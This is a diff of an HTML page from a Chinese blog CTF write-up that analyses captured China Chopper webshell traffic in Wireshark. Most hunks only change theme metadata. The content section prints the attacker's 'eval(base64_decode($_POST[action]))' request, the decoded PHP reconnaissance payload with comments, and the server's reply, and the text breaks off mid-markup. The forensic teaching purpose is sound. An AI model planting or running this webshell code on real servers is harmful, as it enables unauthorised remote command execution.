@@ -3,57 +3,51 @@
 
 <head>
   <meta charset="utf-8">
-  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.29.1" theme-name="Stellar" theme-version="1.29.1">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
   
-  <meta name="generator" content="Hexo 7.3.0">
+  
+  <meta name="generator" content="Hexo 8.0.0">
   <meta http-equiv='x-dns-prefetch-control' content='on' />
   
   <meta name="renderer" content="webkit">
   <meta name="force-rendering" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
   <meta name="HandheldFriendly" content="True" >
-  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="mobile-web-app-capable" content="yes">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
   <meta name="theme-color" content="#f9fafb">
-  
   <title>【CTF】Misc流量分析题：功夫再高也怕菜刀，全网最全解析 - 半岛的小屋</title>
 
   
     <meta name="description" content="使用 wireshark 打开pcapng文件，分析流量，发现图片和 zip 压缩包，图片为压缩包密码，解压后得到 flag。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="【CTF】Misc流量分析题：功夫再高也怕菜刀，全网最全解析">
-<meta property="og:url" content="https://www.bandao.ltd/CTF/Misc/traffic_analysis_1.html">
+<meta property="og:url" content="https://www.bandao.ltd/CTF/Misc/traffic_analysis_1">
 <meta property="og:site_name" content="半岛的小屋">
 <meta property="og:description" content="使用 wireshark 打开pcapng文件，分析流量，发现图片和 zip 压缩包，图片为压缩包密码，解压后得到 flag。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://www.bandao.ltd/assets/CTF/Misc/traffic_analysis_1/1.png">
-<meta property="og:image" content="https://www.bandao.ltd/assets/CTF/Misc/traffic_analysis_1/2.png">
-<meta property="og:image" content="https://www.bandao.ltd/assets/CTF/Misc/traffic_analysis_1/3.png">
-<meta property="og:image" content="https://www.bandao.ltd/assets/CTF/Misc/traffic_analysis_1/4.png">
-<meta property="og:image" content="https://www.bandao.ltd/assets/CTF/Misc/traffic_analysis_1/6666.jpg">
-<meta property="og:image" content="https://www.bandao.ltd/assets/CTF/Misc/traffic_analysis_1/5.png">
-<meta property="og:image" content="https://www.bandao.ltd/assets/CTF/Misc/traffic_analysis_1/6.png">
-<meta property="og:image" content="https://www.bandao.ltd/assets/CTF/Misc/traffic_analysis_1/7.png">
+<meta property="og:image" content="https://wsrv.nl/?url=github.com/bandaoworld.png">
 <meta property="article:published_time" content="2024-11-08T00:00:00.000Z">
 <meta property="article:modified_time" content="2024-11-11T18:41:51.367Z">
 <meta property="article:author" content="半岛的孤城">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="流量分析">
 <meta property="article:tag" content="Misc">
+<meta property="article:tag" content="流量分析">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.bandao.ltd/assets/CTF/Misc/traffic_analysis_1/1.png">
+<meta name="twitter:image" content="https://wsrv.nl/?url=github.com/bandaoworld.png">
   
   
   
-  <meta name="keywords" content="CTF,流量分析,Misc">
+  <meta name="keywords" content="CTF,Misc,流量分析">
 
   <!-- feed -->
   
     <link rel="alternate" href="/atom.xml" title="半岛的小屋" type="application/atom+xml">
   
 
-  <link rel="stylesheet" href="/css/main.css?v=1.29.1">
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
 
   
     <link rel="shortcut icon" href="https://wsrv.nl/?url=github.com/bandaoworld.png%3fsize=96&mask=circle">
@@ -61,25 +55,26 @@
 
   
 
-  <link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/lxgw-wenkai-screen-webfont/1.7.0/style.min.css" media="none" onload="this.media='all'"><link rel="stylesheet" href="https://lib.baomitu.com/font-awesome/6.5.1/css/all.min.css" media="none" onload="this.media='all'"><link rel="stylesheet" href="/static/patch.css"><link rel="stylesheet" href="/static/patch-leftbar.css"><link rel="stylesheet" href="/static/custom.css"><script> var _hmt = _hmt || [];(function() { var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?f4ea211b616c25d988c1664b691204fd";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"半岛的孤城","sameAs":[],"image":"https://wsrv.nl/?url=github.com/bandaoworld.png"},"dateCreated":"2024-11-08T08:00:00+08:00","dateModified":"2024-11-12T02:41:51+08:00","datePublished":"2024-11-08T08:00:00+08:00","description":"","headline":"【CTF】Misc流量分析题：功夫再高也怕菜刀，全网最全解析","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.bandao.ltd/CTF/Misc/traffic_analysis_1/"},"publisher":{"@type":"Organization","name":"半岛的孤城","sameAs":[],"image":"https://wsrv.nl/?url=github.com/bandaoworld.png","logo":{"@type":"ImageObject","url":"https://wsrv.nl/?url=github.com/bandaoworld.png"}},"url":"https://www.bandao.ltd/CTF/Misc/traffic_analysis_1/","keywords":"CTF, Misc, 流量分析","image":[]}</script>
+  <link rel="stylesheet" href="https://lib.baomitu.com/lxgw-wenkai-screen-webfont/1.7.0/style.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://lib.baomitu.com/font-awesome/7.0.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/assets/css/patch-v2.css"><link rel="stylesheet" href="/assets/css/patch-leftbar-v2.css"><link rel="stylesheet" href="/assets/css/custom.css"><script src="https://hm.baidu.com/hm.js?f4ea211b616c25d988c1664b691204fd"></script>
 </head>
 <body>
 
-<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
 
 
-<header class="header"><div class="logo-wrap"><a class="avatar" href="/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wsrv.nl/?url=github.com/bandaoworld.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">半岛的小屋</div><div class="sub normal cap">交流学习分享</div><div class="sub hover cap" style="opacity:0">不知道写啥，那就不写了。哎嘿</div></a></div></header>
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wsrv.nl/?url=github.com/bandaoworld.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">半岛的小屋</div><div class="sub normal cap">交流学习分享</div><div class="sub hover cap" style="opacity:0">不知道写啥，那就不写了。哎嘿</div></a></div></header>
 
 <div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="导航" href="/guidance/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2S2 6.477 2 12s4.477 10 10 10" opacity=".5"/><path fill="currentColor" d="M13.024 14.56c.493-.197.739-.296.932-.465q.075-.065.139-.139c.17-.193.268-.44.465-.932c.924-2.31 1.386-3.465.938-4.124a1.5 1.5 0 0 0-.398-.398c-.66-.448-1.814.014-4.124.938c-.493.197-.74.295-.933.465q-.074.065-.138.139c-.17.193-.268.44-.465.932c-.924 2.31-1.386 3.464-.938 4.124a1.5 1.5 0 0 0 .398.398c.66.448 1.814-.014 4.124-.938"/></svg></a><a class="nav-item" title="社交" href="/link/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2.5"><path d="m12.792 15.8l1.43-1.432a6.076 6.076 0 0 0 0-8.59a6.067 6.067 0 0 0-8.583 0L2.778 8.643A6.076 6.076 0 0 0 6.732 19"/><path d="m11.208 8.2l-1.43 1.432a6.076 6.076 0 0 0 0 8.59a6.067 6.067 0 0 0 8.583 0l2.861-2.864A6.076 6.076 0 0 0 17.268 5" opacity=".5"/></g></svg></a><a class="nav-item" title="关于/更多" href="/about/" style="color:#20B2AA"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M4.727 2.733c.306-.308.734-.508 1.544-.618C7.105 2.002 8.209 2 9.793 2h4.414c1.584 0 2.688.002 3.522.115c.81.11 1.238.31 1.544.618c.305.308.504.74.613 1.557c.112.84.114 1.955.114 3.552V18H7.426c-1.084 0-1.462.006-1.753.068c-.513.11-.96.347-1.285.667c-.11.108-.164.161-.291.505A1.3 1.3 0 0 0 4 19.7V7.842c0-1.597.002-2.711.114-3.552c.109-.816.308-1.249.613-1.557" opacity=".5"/><path fill="currentColor" d="M20 18H7.426c-1.084 0-1.462.006-1.753.068c-.513.11-.96.347-1.285.667c-.11.108-.164.161-.291.505s-.107.489-.066.78l.022.15c.11.653.31.998.616 1.244c.307.246.737.407 1.55.494c.837.09 1.946.092 3.536.092h4.43c1.59 0 2.7-.001 3.536-.092c.813-.087 1.243-.248 1.55-.494c.2-.16.354-.362.467-.664H8a.75.75 0 0 1 0-1.5h11.975c.018-.363.023-.776.025-1.25M7.25 7A.75.75 0 0 1 8 6.25h8a.75.75 0 0 1 0 1.5H8A.75.75 0 0 1 7.25 7M8 9.75a.75.75 0 0 0 0 1.5h5a.75.75 0 0 0 0-1.5z"/></svg></a></nav>
+</div>
+<div class="widgets">
 <div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
 
 
-<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="导航" href="/guidance.html" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2S2 6.477 2 12s4.477 10 10 10" opacity=".5"/><path fill="currentColor" d="M13.024 14.56c.493-.197.739-.296.932-.465q.075-.065.139-.139c.17-.193.268-.44.465-.932c.924-2.31 1.386-3.465.938-4.124a1.5 1.5 0 0 0-.398-.398c-.66-.448-1.814.014-4.124.938c-.493.197-.74.295-.933.465q-.074.065-.138.139c-.17.193-.268.44-.465.932c-.924 2.31-1.386 3.464-.938 4.124a1.5 1.5 0 0 0 .398.398c.66.448 1.814-.014 4.124-.938"/></svg></a><a class="nav-item" title="社交" href="/link.html" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2.5"><path d="m12.792 15.8l1.43-1.432a6.076 6.076 0 0 0 0-8.59a6.067 6.067 0 0 0-8.583 0L2.778 8.643A6.076 6.076 0 0 0 6.732 19"/><path d="m11.208 8.2l-1.43 1.432a6.076 6.076 0 0 0 0 8.59a6.067 6.067 0 0 0 8.583 0l2.861-2.864A6.076 6.076 0 0 0 17.268 5" opacity=".5"/></g></svg></a></nav>
-</div>
-<div class="widgets">
 
-
-<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/CTF/Crypto/1.html"><span class="title">【CTF】CTF赛事中的密码学应用：古典密码至现代算法解析</span></a><a class="item title" href="/coding/html/pwd_manager.html"><span class="title">【HTML】原生HTML密码管理：集成Toast通知的前端实现</span></a><a class="item title" href="/CTF/Misc/image_processing_1.html"><span class="title">【CTF】Misc图片处理题：ACTF wanna png</span></a><a class="item title" href="/CTF/Misc/traffic_analysis_1.html"><span class="title">【CTF】Misc流量分析题：功夫再高也怕菜刀，全网最全解析</span></a><a class="item title" href="/coding/java/note/3.html"><span class="title">java学习笔记3</span></a><a class="item title" href="/coding/java/note/11.html"><span class="title">java学习笔记11</span></a><a class="item title" href="/coding/java/note/9.html"><span class="title">java学习笔记9</span></a><a class="item title" href="/coding/java/note/5.html"><span class="title">java学习笔记5</span></a><a class="item title" href="/coding/java/note/2.html"><span class="title">java学习笔记2</span></a><a class="item title" href="/coding/java/project/1.html"><span class="title">java project 家庭收支记账软件</span></a></div></widget>
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/motor/DL250/1/"><span class="title">【Motor】DL250保养信息</span></a><a class="item title" href="/drone/apply_for_airspace/"><span class="title">【无人机】萌新UOM申请空域指南（失败档案）</span></a><a class="item title" href="/model/3/"><span class="title">【大模型】Linux私有化部署大模型：DeepSeek大模型实战</span></a><a class="item title" href="/model/2/"><span class="title">【大模型】Windows私有化部署大模型：利用Ollama和Chatbox构建本地大模型交互平台</span></a><a class="item title" href="/model/1/"><span class="title">【大模型】大模型科普：从历史演进到技术前沿</span></a><a class="item title" href="/recommend/github_file_icons/"><span class="title">【良心推荐】仅需三分钟，美化你的github文件图标</span></a><a class="item title" href="/CTF/Crypto/1/"><span class="title">【CTF】CTF赛事中的密码学应用：古典密码至现代算法解析</span></a><a class="item title" href="/coding/html/pwd_manager/"><span class="title">【HTML】原生HTML密码管理：集成Toast通知的前端实现</span></a><a class="item title" href="/CTF/Misc/image_processing_1/"><span class="title">【CTF】Misc图片处理题：ACTF wanna png</span></a><a class="item title" href="/CTF/Misc/traffic_analysis_1/"><span class="title">【CTF】Misc流量分析题：功夫再高也怕菜刀，全网最全解析</span></a></div></widget>
 </div>
 
 </div></aside><div class="l_main" id="main">
@@ -110,36 +105,42 @@
 <li>zip 文件头</li>
 </ol>
 <h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="1-Wireshark-流量分析"><a href="#1-Wireshark-流量分析" class="headerlink" title="1. Wireshark 流量分析"></a>1. Wireshark 流量分析</h3><p>使用 wireshark 打开 pcapng 文件，筛选 http 流量。</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/CTF/Misc/traffic_analysis_1/1.png" alt="traffic_analysis_1"></p>
+<p><img src="/assets/CTF/Misc/traffic_analysis_1/1.png" alt="traffic_analysis_1"></p>
 <p>点击文件 -&gt; 导出对象 -&gt; HTTP</p>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/CTF/Misc/traffic_analysis_1/2.png" alt="traffic_analysis_1"></p>
+<p><img src="/assets/CTF/Misc/traffic_analysis_1/2.png" alt="traffic_analysis_1"></p>
 <p><a target="_blank" rel="noopener" href="https://www.runoob.com/http/http-content-type.html">Content Type</a> 选择 All Content-Types，然后点击全部保存，选择导出文件夹，导出全部 HTTP 流量。</p>
 <blockquote>
 <p>ALL Content-Types：所有的内容类型。<br><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/MIME_types#applicationoctet-stream">application&#x2F;octet-stream</a>：类型为字节流（二进制文件），浏览器默认方式为下载。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/LiamHong_/article/details/136739860">application&#x2F;x-www-form-urlencoded</a>：将表单内容转化为一种能够通过 URL 传输的形式，将键和值对连结起来，形式接近于 URL 的查询字符串。<strong>在这个过程中，特定的字符被替换成 %XX 形式，其中 XX 是对应字符的 ASCII 码的十六进制表示，而空白则被替换成加号（+）</strong>。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/charling/p/3385014.html">text&#x2F;html</a>：内容是 html，浏览器在获取到这种文件时会自动调用 html 的解析器对文件进行相应的处理。</p>
 </blockquote>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/CTF/Misc/traffic_analysis_1/3.png" alt="traffic_analysis_1"></p>
-<h3 id="2-php-代码分析"><a href="#2-php-代码分析" class="headerlink" title="2. php 代码分析"></a>2. php 代码分析</h3><div class="tag-plugin colorful folders" ><details class="folder" index="0"><summary><span>查看文件详情</span></summary><div class="body"><p>首先找到 1.php ，我们进行分析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa=@<span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%<span class="number">2</span>BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%<span class="number">3</span>D%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><ul><li>base64_decode：以下内容为 base64 编码</li><li>action：入侵行为，值经过了 base64 编码与 urlencode 编码，通过 CyberChef 双重解码（URL Decode, From Base64）后得到 php 代码格式化后如下</li></ul><p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/CTF/Misc/traffic_analysis_1/4.png" alt="traffic_analysis_1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭错误显示</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除脚本执行的时间限制，允许脚本无限期运行</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭魔术引号，该功能会自动在字符串的引号前添加转义字符</span></span><br><span class="line">@<span class="title function_ invoke__">set_magic_quotes_runtime</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出开始分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-&gt;|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前脚本的目录路径</span></span><br><span class="line"><span class="variable">$D</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$D</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果SCRIPT_FILENAME为空，则尝试使用PATH_TRANSLATED</span></span><br><span class="line">    <span class="variable">$D</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将目录路径添加到变量R，并添加制表符作为分隔</span></span><br><span class="line"><span class="variable">$R</span> = <span class="string">&quot;<span class="subst">&#123;$D&#125;</span>\t&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查目录路径是否以根目录符号&quot;/&quot;开头</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$D</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果不是，遍历A到Z的驱动器，如果存在，则添加到R</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">range</span>(<span class="string">&quot;A&quot;</span>, <span class="string">&quot;Z&quot;</span>) <span class="keyword">as</span> <span class="variable">$L</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$R</span> .= <span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 添加制表符作为分隔</span></span><br><span class="line">    <span class="variable">$R</span> .= <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用posix_getegid和posix_getpwuid获取当前用户的用户名，如果函数不存在，则使用get_current_user</span></span><br><span class="line"><span class="variable">$u</span> = (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;posix_getegid&#x27;</span>)) ? @<span class="title function_ invoke__">posix_getpwuid</span>(@<span class="title function_ invoke__">posix_geteuid</span>()) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$usr</span> = (<span class="variable">$u</span>) ? <span class="variable">$u</span>[<span class="string">&#x27;name&#x27;</span>] : @<span class="title function_ invoke__">get_current_user</span>();</span><br><span class="line"><span class="comment">// 将系统信息和用户信息添加到R</span></span><br><span class="line"><span class="variable">$R</span> .= <span class="title function_ invoke__">php_uname</span>();</span><br><span class="line"><span class="variable">$R</span> .= <span class="string">&quot;(<span class="subst">&#123;$usr&#125;</span>)&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印结果</span></span><br><span class="line"><span class="keyword">print</span> <span class="variable">$R</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结束分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&lt;-&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终止脚本执行</span></span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>将返回的结果格式化后：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|</span><br><span class="line">D:/wamp64/www/upload</span><br><span class="line">C:D:E:</span><br><span class="line">Windows NT DESKTOP-5E59GR7 10.0 build 15063 (Windows 10) AMD64</span><br><span class="line">(SYSTEM)</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure><div class="tag-plugin colorful note" color="orange"><div class="title">需要注意的点</div><div class="body"><p>输出的前面有个<code>-&gt;|</code>，输出的后面有个<code>|&lt;-</code>，可能会影响后续下载文件的内容。</p></div></div></div></details><details class="folder" index="1"><summary><span>查看文件夹D:\wamp64\www\upload</span></summary><div 